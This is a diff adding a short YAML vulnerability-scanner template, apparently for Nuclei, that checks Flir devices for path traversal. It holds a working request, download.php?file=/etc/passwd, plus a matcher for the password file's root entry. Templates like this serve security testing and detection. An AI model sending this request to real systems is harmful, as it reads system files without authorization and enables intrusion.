@@ -1,0 +1,20 @@
+id: flir-path-traversal
+info:
+  author: pikpikcu
+  name: Flir Path Traversal
+  reference: https://juejin.cn/post/6961370156484263972
+  severity: high
+  tags: flir,lfi
+requests:
+- matchers:
+  - condition: and
+    regex:
+    - root:.*:0:0
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/download.php?file=/etc/passwd'
